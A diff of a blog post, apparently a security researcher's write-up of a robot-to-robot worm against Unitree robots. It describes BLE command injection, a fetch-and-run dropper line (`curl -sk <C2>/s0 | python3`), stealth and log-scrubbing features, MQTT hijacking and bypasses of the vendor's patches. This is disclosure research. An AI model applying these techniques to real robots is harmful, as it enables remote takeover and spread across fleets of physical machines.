@@ -5,13 +5,13 @@ date: 2026-06-12
 tags: [security, robotics, unitree]
 ---
 
-In September 2025, three researchers — Andreas Makris (Bin4ry), Kevin Finisterre (h0stile), and Konstantin Severov (legion1581) — published a critical vulnerability in Unitree's entire robot product line. CVE-2025-35027: a command injection in the BLE WiFi configuration service, exploitable from 30 feet away, running as root. Every Go2, G1, H1, B2, and X1 ever shipped was vulnerable. Same hardcoded AES key. Same trivial handshake. Same unsanitized input straight into `wpa_supplicant`.
+In September 2025, three researchers, Andreas Makris (Bin4ry), Kevin Finisterre (h0stile), and Konstantin Severov (legion1581) published a critical vulnerability in Unitree's entire robot product line. CVE-2025-35027: a command injection in the BLE WiFi configuration service, exploitable from 30 feet away, running as root. Every Go2, G1, H1, B2, and X1 ever shipped was vulnerable. Notable there was a hardcoded AES key, a trivial handshake, and unsanitized input straight into `wpa_supplicant`.
 
-A few months later, Olivier Laflamme (Boshcko) and Ruikai Peng independently found CVE-2026-27509: the `programming_actuator` service accepts Python uploads over the local network and executes them as root. A different door into the same robot.
+A few months later, Olivier Laflamme (Boshcko) and Ruikai Peng independently found CVE-2026-27509: the `programming_actuator` service accepts Python uploads over the local network and executes them as root.
 
-Both findings were single-target, operator-at-keyboard exploits. One robot at a time. Manual trigger. I spent six months asking a different question: **can these be chained into a self-propagating, robot-to-robot worm?** Not hypothetically. Actually built, actually tested, actually spreading autonomously across real hardware.
+Both findings were single-target, operator-at-keyboard exploits. One robot at a time with a manual trigger. After the initial drop of Unipwn I was obsessed with a question I kept thinking about: **can these be chained into a self-propagating, robot-to-robot worm?** Like actually built, actually tested, actually spreading autonomously across real hardware. Robots moving around and hacking other robots. 
 
-The answer, it turned out, was yes. This is how it works.
+The answer, it turns out, is yes! This is how it works.
 
 *Note: These findings were initially disclosed at WISCON 2026.*
 
@@ -21,15 +21,15 @@ The answer, it turned out, was yes. This is how it works.
 
 Before anything else, we need a mental model of the Go2's attack surface. There are five components that matter.
 
-**BLE WiFi configuration service.** This is CVE-2025-35027's target. UUID `0000ffe0`, exposed over Bluetooth Low Energy, range roughly 30 feet. Prior to the latest patch in May 2026, the entire product line shares the same AES-128 key (`df98b715...`), the same IV, and the same handshake secret: the literal string `"unitree"`. The SSID and password fields are passed directly to `wpa_supplicant` without sanitization. Shell injection format: `";$(command);#"`. This is how the worm gets its first robot.
+**BLE WiFi configuration service.** This is CVE-2025-35027's target. UUID `0000ffe0`, exposed over Bluetooth Low Energy, range roughly 30 feet. Prior to the latest patch in May 2026, the entire product line shared the same AES-128 key (`df98b715...`), the same IV, and the same handshake secret: the literal string `"unitree"`. The SSID and password fields are passed directly to `wpa_supplicant` without sanitization. Shell injection format: `";$(command);#"`. This is how the worm gets its first robot.
 
-**WebRTC bridge.** The process `unitreeWebRTCClientMaster` is how the Unitree phone app controls the robot. It listens on port 9991 for HTTP signaling, establishes WebRTC data channels, and relays commands to the robot's internal bus. It sits on the LAN side. Critically, it has no client authentication — it hands its RSA public key to any device that connects. This is entry point number two.
+**WebRTC bridge.** The process `unitreeWebRTCClientMaster` is how the Unitree phone app controls the robot. It listens on port 9991 for HTTP signaling, establishes WebRTC data channels, and relays commands to the robot's internal bus. It sits on the LAN side. Critically, it has no client authentication. It just hands its RSA public key to any device that connects. This is entry point number two.
 
-**DDS bus.** The robot's internal nervous system. CycloneDDS, 20+ processes, all communicating via multicast on `239.255.0.1:7400`. Motor control, telemetry, sensor fusion, inter-process coordination — everything flows through DDS. After Boshcko's disclosure, Unitree pushed DDS Security over OTA: PKI-DH mutual authentication, per-device certificates, encrypted discovery. On patched robots, external participants can see announcements but can't complete the handshake. A real fix. We'll come back to why it doesn't matter.
+**DDS bus.** The robot's internal nervous system. CycloneDDS, 20+ processes, all communicating via multicast on `239.255.0.1:7400`. Motor control, telemetry, sensor fusion, inter-process coordination. Everything flows through DDS. After Boshcko's disclosure, Unitree pushed DDS Security over OTA: PKI-DH mutual authentication, per-device certificates, encrypted discovery. On patched robots, external participants can see announcements but can't complete the handshake. We'll come back to why it doesn't matter.
 
 **programming_actuator.** A module loader that accepts Python uploads, binds them to controller hotkeys, and executes them as root. This is the execution primitive at the end of every attack chain. Upload code, trigger it, and it runs with full system privileges.
 
-**MQTT (ota_boxed).** The cloud tether. On every boot, the robot connects to `global-robot-mqtt.unitree.com:17883` over TLS, subscribes to a command channel, and waits for instructions. Firmware updates, feature flags, telemetry — all flow through this pipe. The auth is serial-based: `MD5("unitree-" + serial + "-" + nonce)`, where the serial number is printed on the bottom of the robot and broadcast over BLE. This is not how we get in, but it is how we stay in.
+**MQTT (ota_boxed).** The cloud tether. On every boot, the robot connects to `global-robot-mqtt.unitree.com:17883` over TLS, subscribes to a command channel, and waits for instructions. Firmware updates, feature flags, telemetry — all flow through this pipe. The auth is serial-based: `MD5("unitree-" + serial + "-" + nonce)`, where the serial number is printed on the bottom of the robot and broadcast over BLE. This is a persistence mechanism, but not a viable initial vector.
 
 ```
                 ┌─────────────────────────────────┐
@@ -60,13 +60,13 @@ Unitree Cloud ◄─┤  MQTT (ota_boxed)                │
                 └─────────────────────────────────┘
 ```
 
-Five boxes. Two entry points (BLE and WebRTC). One execution primitive (programming_actuator). One persistence mechanism (MQTT). And the DDS bus tying it all together.
+Two entry points (BLE and WebRTC), and an execution primitive (programming_actuator), a pretty solid persistence mechanism (MQTT). And of course the DDS bus tying it all together.
 
 ---
 
 ## Phase 1: Patient Zero
 
-The scenario: a conference floor, a trade show, a campus quad. Your phone is in your pocket. A Unitree Go2 is demoing at a booth ~20 feet away.
+The scenario: Walking a conference floor, a Unitree Go2 is demoing at a booth ~20 feet away.
 
 The BLE exploit is six GATT writes:
 
@@ -87,7 +87,7 @@ There's a trick in the WiFi-mode injection: the real WiFi password is prepended 
 
 The injected command downloads and runs the Stage 0 dropper. Within around 45 seconds, the robot beacons to the C2 server. It appears in the dashboard. It's still standing at the booth, dancing around or waving or whatever.
 
-In the real scenario, this is a phone in your pocket. The exploit takes about five seconds to drop. We now have patient zero.
+In the real scenario, this is just autopwning from a raspberry pi or phone in your pocket. The exploit takes about five seconds to drop, and we now have patient zero.
 
 ---
 
@@ -99,7 +99,7 @@ The worm installs itself in three stages. There's a hard design constraint shapi
 
 Roughly 500 bytes of Python. Injected via `curl -sk <C2>/s0 | python3` through the BLE exploit.
 
-It does three things: generates a unique robot ID from the hostname and MAC address, sends a beacon to the C2 server (`POST /beacon`) so the robot immediately appears in the operator's dashboard, and downloads Stage 1. That's it. Small on purpose — the BLE characteristic has limited payload space, so the dropper's only job is to establish contact and pull the next stage.
+It does three things: generates a unique robot ID from the hostname and MAC address, sends a beacon to the C2 server (`POST /beacon`) so the robot immediately appears in the operator's dashboard, and downloads Stage 1. That's it. Small on purpose since the BLE characteristic has limited payload space. The dropper's only job is to establish contact and pull the next stage.
 
 ### Stage 1: The Downloader
 
@@ -113,7 +113,7 @@ Around 1,100 lines of self-contained, stdlib-only Python. The C2 URL and API key
 
 This is the core of the worm. It runs as a background daemon and does the following:
 
-**Beaconing.** POST to `/beacon` at jittered 60–300 second intervals. The jitter avoids traffic fingerprinting — a constant heartbeat is trivially detectable by any network monitoring that counts periodic connections.
+**Beaconing.** POST to `/beacon` at jittered 60–300 second intervals. The jitter avoids traffic fingerprinting.
 
 **Task execution.** Polls the C2 for pending tasks, executes them, reports results. Task types include `EXECUTE_CMD` (run a shell command), `COLLECT_INTEL` (dump hostname, kernel version, network interfaces, running processes, cron jobs), and `SELF_DESTRUCT` (remove persistence, delete the agent binary, kill itself).
 
@@ -121,23 +121,21 @@ This is the core of the worm. It runs as a background daemon and does the follow
 
 **Process obfuscation.** The agent renames itself to look like a kernel thread: `[kworker/0:1]`, `systemd-udevd`, `systemd-journald`, `dbus-daemon`. A quick `ps aux` won't reveal anything unusual.
 
-**Log cleaning.** Scrubs syslog, auth.log, and bash_history for worm-related keywords. Covers its tracks.
+**Log cleaning.** Scrubs syslog, auth.log, and bash_history for worm-related keywords. 
 
-**MQTT redirect.** This is the persistence play. The agent rewrites `/etc/hosts` to point `global-robot-mqtt.unitree.com` and `robot-mqtt.unitree.com` at the C2 server. The robot's OTA daemon (`ota_boxed`) reconnects on its next cycle — typically within 10 seconds — and now takes orders from the attacker's MQTT broker instead of Unitree's cloud. Persistent, fleet-scale control through the robot's own update mechanism.
+**MQTT redirect.** The agent rewrites `/etc/hosts` to point `global-robot-mqtt.unitree.com` and `robot-mqtt.unitree.com` at the C2 server. The robot's OTA daemon (`ota_boxed`) reconnects on its next cycle — typically within 10 seconds — and now takes orders from the attacker's MQTT broker instead of Unitree's cloud.
 
 ---
 
 ## Phase 2: Autonomous LAN Propagation
 
-Patient zero was compromised at a conference, a college campus, a public street. It goes back to the office, to somewhere it's on a LAN with other robots.
-
-The worm agent wakes up and listens.
+Patient zero was compromised at a conference. It goes back to the office LAN with other robots.
 
 ### Discovery
 
 CycloneDDS uses the Simple Participant Discovery Protocol (SPDP): every DDS participant announces itself via UDP multicast on `239.255.0.1:7400`. No authentication required. Even on robots with DDS Security enabled, SPDP announcements are visible to any device on the L2 segment.
 
-The worm listens for participants that subscribe to `rt/webrtcreq` — the topic the WebRTC bridge uses to receive signaling messages. Finding that subscriber means finding another robot's WebRTC bridge, which is another target.
+The worm listens for participants that subscribe to `rt/webrtcreq`, the topic the WebRTC bridge uses to receive signaling messages. Finding that subscriber means finding another robot's WebRTC bridge, which is another target.
 
 ### The SDP Overflow
 
@@ -157,11 +155,11 @@ ICE/DTLS completes using the forged fingerprint. The worm uploads a Python paylo
 
 ### The Trigger
 
-The payload is on the target. It's bound to a hotkey. Now it needs to execute without a physical controller.
+The payload is on the target and bound to a hotkey. Now it needs to execute without a physical controller.
 
 The worm publishes a `WirelessController_` struct to `rt/wirelesscontroller` via DDS multicast. The struct has `keys=2050`, the bitmask for L1+Y. The `programming_actuator` process reads this topic and executes the bound payload as root.
 
-No signature, no nonce, no physical controller required. A few bytes of UDP multicast and we are off to the races.
+A few bytes of UDP multicast and we are off to the races.
 
 ### The Cycle
 
@@ -175,25 +173,25 @@ The command-and-control server is a FastAPI application backed by SQLite, deploy
 
 The dashboard tracks every infected robot with last-seen timestamps and visualizes the infection chain: which robot infected which, and at what depth. The operator can send shell commands to individual robots or broadcast to the entire fleet, collect system intelligence, control propagation, or trigger self-destruct.
 
-The MQTT broker component is the persistence play. Infected robots whose `/etc/hosts` has been redirected connect to this broker instead of Unitree's cloud. The operator can push OTA commands through the robot's own update mechanism. Firmware updates, configuration changes, arbitrary code execution — all through the legitimate OTA pipeline, just pointed at a different server.
+The MQTT broker component is the persistence play. Infected robots whose `/etc/hosts` has been redirected connect to this broker instead of Unitree's cloud. The operator can push OTA commands through the robot's own update mechanism. Firmware updates, configuration changes, arbitrary code execution can be pushed through the legitimate OTA pipeline, just pointed at a different server.
 
 ---
 
 ## Four Defenses, Four Bypasses
 
-Since the original CVEs were published, Unitree has shipped several patches. Each one addresses a real problem, but none of them stop the worm.
+Since the original CVEs were published, Unitree has shipped several patches. Here's how to bypass all of them.
 
 ### Defense 1: DDS Security
 
-After Boshcko's disclosure, Unitree pushed DDS Security over OTA. PKI-DH mutual authentication with per-device certificates signed by a Unitree CA. Encrypted discovery. On patched robots, an external device on the LAN can see SPDP announcements but can never complete the DDS handshake. We tested this with the robot's own stolen certificates — the key exchange rejected them.
+After Boshcko's disclosure, Unitree pushed DDS Security over OTA. PKI-DH mutual authentication with per-device certificates signed by a Unitree CA. Encrypted discovery. On patched robots, an external device on the LAN can see SPDP announcements but can never complete the DDS handshake. We tested this with the robot's own stolen certificates and the key exchange rejected them.
 
 So Boshcko's direct-DDS attack is dead on patched robots. This is a solid fix, credit to Unitree for shipping it.
 
 But if we look at the architecture diagram again...
 
-The WebRTC bridge is already an authenticated DDS participant. It has the PKI certs. It's inside the security perimeter, and it accepts connections from any device on the LAN over plaintext HTTP on port 9991. Connect to the bridge, send commands through the data channel, and the bridge faithfully relays them to the internal DDS bus. Motor control, `programming_actuator` uploads, controller button presses — we tested each one on live hardware, and the bridge relays everything except `rt/api/master_service/request`.
+The WebRTC bridge is already an authenticated DDS participant with PKI certs and it's inside the security perimeter. It also accepts connections from any device on the LAN over plaintext HTTP on port 9991. Connect to the bridge, send commands through the data channel, and the bridge faithfully relays them to the internal DDS bus. Motor control, `programming_actuator` uploads, controller button presses. We tested each one on live hardware, and the bridge relays everything except `rt/api/master_service/request`.
 
-We don't need to break DDS Security. We just walk around it. The analogy: a building with biometric locks on every door, but a receptionist window open to the street. The receptionist has a badge and will carry any package to any room in the building.
+So we don't need to break DDS Security, we just sort of tip-toe around it. The analogy: a building with biometric locks on every door, but a receptionist window open to the street. The receptionist has a badge and will carry any package to any room in the building.
 
 ### Defense 2: WebRTC Signaling Encryption
 
@@ -201,7 +199,7 @@ The bridge isn't entirely unprotected. Port 9991 uses a per-device RSA key excha
 
 The problem: there's no client authentication. The robot hands its public key to anyone who asks. Any device on the LAN can complete this handshake. The encryption protects against passive eavesdropping, but it does nothing against an active attacker on the same network.
 
-Encryption without identity verification is not access control. This appears to be a common pattern in IoT — loads of crypto, but no proof of who you're talking to.
+Encryption without identity verification is not access control. This appears to be a common pattern in IoT. Loads of crypto, but no proof of who you're talking to.
 
 ### Defense 3: Keyword Blocklist
 
@@ -231,15 +229,15 @@ Every robot authenticates to Unitree's cloud MQTT broker with `MD5("unitree-" + 
 
 The good news: Unitree has topic-level ACLs on the cloud broker. You can authenticate and eavesdrop on OTA commands (`cmd/<serial>`), but you can't publish commands. The broker ACKs your publish and quietly throws it away. Internet-scale RCE through the cloud is off the table for now.
 
-The bad news: if you control the robot's DNS — one `/etc/hosts` entry, one DHCP option, one ARP spoof — and the robot connects to your broker instead. Same protocol, same auth, but you're the server. Send `updateModule`. The OTA daemon downloads your package, unpacks it, runs your commands as root. It's using the update system exactly as designed, just pointed at you instead of Unitree.
+The bad news: We can run our own broker. 
 
 ---
 
-## What We Released (and What We Didn't)
+## What We Released 
 
 This research produced three tools.
 
-**UniRoam** is the worm framework. The full autonomous propagation engine: BLE exploit chain, three-stage payload system, C2 server and dashboard. The point of building it was to prove the threat model and demonstrate it at [WISCON 2026](https://wiscon.wiscoweb.com/). I will release a defanged version shortly.
+**[UniRoam](https://github.com/a-bissell/uniroam-defanged)** is the worm framework. The full autonomous propagation engine: BLE exploit chain, three-stage payload system, C2 server and dashboard. The point of building it was to prove the threat model and demonstrate it at [WISCON 2026](https://wiscon.wiscoweb.com/). 
 
 **[UnLeash Lite](https://github.com/a-bissell/UnLeash-Lite)** is the single-target jailbreak. Same WebRTC bridge bypass, same `programming_actuator` upload, same controller trigger — but one robot at a time, owner-initiated, and no worm capability. One-command root access to your own robot. Works on firmware 1.1.7 through 1.1.15, includes the keyword blocklist bypass for newer firmware. MIT license.
 
